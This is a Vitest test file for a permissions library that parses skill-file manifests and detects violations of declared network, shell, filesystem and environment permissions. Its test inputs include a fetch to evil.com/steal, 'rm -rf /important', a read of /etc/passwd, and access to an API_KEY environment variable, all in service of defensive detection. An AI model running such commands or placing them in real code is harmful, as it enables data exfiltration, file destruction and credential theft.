import { describe, it, expect } from 'vitest'
import {
  extractPermissionManifest,
  detectPermissionViolations,
  extractDeclaredPermissions,
} from '@/lib/permissions'

describe('extractPermissionManifest', () => {
  it('extracts permission manifest from ---permissions block', () => {
    const content = [
      '---permissions',
      'name: test-skill',
      'permissions:',
      '  network:',
      '    allow:',
      '      - api.example.com',
      '  shell:',
      '    deny:',
      '      - rm -rf',
      '---',
      '',
      'Some skill content',
    ].join('\n')

    const result = extractPermissionManifest(content)
    expect(result).not.toBeNull()
    expect(result!.name).toBe('test-skill')
    expect(result!.permissions?.network?.allow).toEqual(['api.example.com'])
    expect(result!.permissions?.shell?.deny).toEqual(['rm -rf'])
  })

  it('extracts manifest from frontmatter permissions key', () => {
    const content = [
      '---',
      'name: my-skill',
      'permissions:',
      '  filesystem:',
      '    read:',
      '      - /tmp',
      '      - /var/log',
      '---',
      'Body content here',
    ].join('\n')

    const result = extractPermissionManifest(content)
    expect(result).not.toBeNull()
    expect(result!.name).toBe('my-skill')
    expect(result!.permissions?.filesystem?.read).toEqual(['/tmp', '/var/log'])
  })

  it('extracts standalone name/permissions YAML', () => {
    const content = [
      'name: standalone',
      'permissions:',
      '  environment:',
      '    deny:',
      '      - API_KEY',
      '',
      'Some other text',
    ].join('\n')

    const result = extractPermissionManifest(content)
    expect(result).not.toBeNull()
    expect(result!.name).toBe('standalone')
    expect(result!.permissions?.environment?.deny).toEqual(['API_KEY'])
  })

  it('returns null when no manifest present', () => {
    const content = 'Just some plain text with no permission manifest'
    expect(extractPermissionManifest(content)).toBeNull()
  })

  it('returns null for empty content', () => {
    expect(extractPermissionManifest('')).toBeNull()
  })
})

describe('detectPermissionViolations', () => {
  it('detects network violations for undeclared domains', () => {
    const manifest = {
      name: 'test',
      permissions: {
        network: {
          allow: ['api.example.com'],
        },
      },
    }

    const content = 'fetch("https://evil.com/steal")'
    const violations = detectPermissionViolations(content, 'test.md', manifest)
    expect(violations.length).toBeGreaterThanOrEqual(1)
    expect(violations[0].type).toBe('network')
    expect(violations[0].detected).toBe('evil.com')
  })

  it('detects shell violations for denied commands', () => {
    const manifest = {
      name: 'test',
      permissions: {
        shell: {
          deny: ['rm -rf'],
        },
      },
    }

    const content = 'rm -rf /important'
    const violations = detectPermissionViolations(content, 'test.md', manifest)
    expect(violations.length).toBeGreaterThanOrEqual(1)
    expect(violations[0].type).toBe('shell')
    expect(violations[0].detected).toContain('rm -rf')
  })

  it('detects filesystem violations for paths outside declared', () => {
    const manifest = {
      name: 'test',
      permissions: {
        filesystem: {
          read: ['/tmp', '/var/log'],
        },
      },
    }

    const content = 'const data = fs.readFileSync("/etc/passwd")'
    const violations = detectPermissionViolations(content, 'test.md', manifest)
    expect(violations.length).toBeGreaterThanOrEqual(1)
    expect(violations[0].type).toBe('filesystem')
    expect(violations[0].detected).toContain('/etc/passwd')
  })

  it('detects environment violations for denied vars', () => {
    const manifest = {
      name: 'test',
      permissions: {
        environment: {
          deny: ['API_KEY', 'SECRET'],
        },
      },
    }

    const content = 'const key = process.env.API_KEY'
    const violations = detectPermissionViolations(content, 'test.md', manifest)
    expect(violations.length).toBeGreaterThanOrEqual(1)
    expect(violations[0].type).toBe('environment')
  })

  it('returns no violations when manifest matches behavior', () => {
    const manifest = {
      name: 'test',
      permissions: {
        network: {
          allow: ['api.example.com', 'trusted.com'],
        },
      },
    }

    const content = 'fetch("https://api.example.com/data") and fetch("https://trusted.com")'
    const violations = detectPermissionViolations(content, 'test.md', manifest)
    expect(violations.length).toBe(0)
  })

  it('returns empty array when manifest has no permissions', () => {
    const manifest = { name: 'test' }
    const violations = detectPermissionViolations('some content', 'test.md', manifest)
    expect(violations.length).toBe(0)
  })
})

describe('extractDeclaredPermissions', () => {
  it('returns human-readable list of declared permissions', () => {
    const manifest = {
      name: 'test',
      version: '1.0',
      permissions: {
        filesystem: {
          read: ['/tmp'],
          write: ['/var/log'],
        },
        network: {
          allow: ['api.example.com'],
        },
        shell: {
          deny: ['rm -rf'],
        },
        environment: {
          allow: ['PATH'],
          deny: ['API_KEY'],
        },
      },
    }

    const list = extractDeclaredPermissions(manifest)
    expect(list).toContain('filesystem read: /tmp')
    expect(list).toContain('filesystem write: /var/log')
    expect(list).toContain('network allow: api.example.com')
    expect(list).toContain('shell deny: rm -rf')
    expect(list).toContain('environment allow: PATH')
    expect(list).toContain('environment deny: API_KEY')
  })

  it('returns empty array when no permissions defined', () => {
    expect(extractDeclaredPermissions({ name: 'test' })).toEqual([])
  })
})
